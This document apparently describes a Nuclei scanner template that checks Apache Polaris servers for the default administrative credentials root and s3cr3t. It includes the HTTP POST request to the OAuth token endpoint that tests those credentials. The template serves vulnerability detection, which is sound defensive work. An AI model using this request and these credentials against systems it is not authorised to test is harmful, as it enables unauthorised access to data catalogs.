# Nuclei Template: Apache Polaris - Default Login
**Template ID:** apache-polaris-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`apache-polaris-default-login.yaml`)

## Vulnerability Information & PoC

## Description
The Apache Polaris server is configured with default administrative credentials, allowing an attacker to perform unauthorized operations. This template verifies the use of the default username root and password s3cr3t.

## Steps to reproduce / Exploit Payload
```http
POST /api/catalog/v1/oauth/tokens HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

grant_type=client_credentials&client_id={{username}}&client_secret={{password}}&scope=PRINCIPAL_ROLE:ALL
```

## References
- https://github.com/apache/polaris
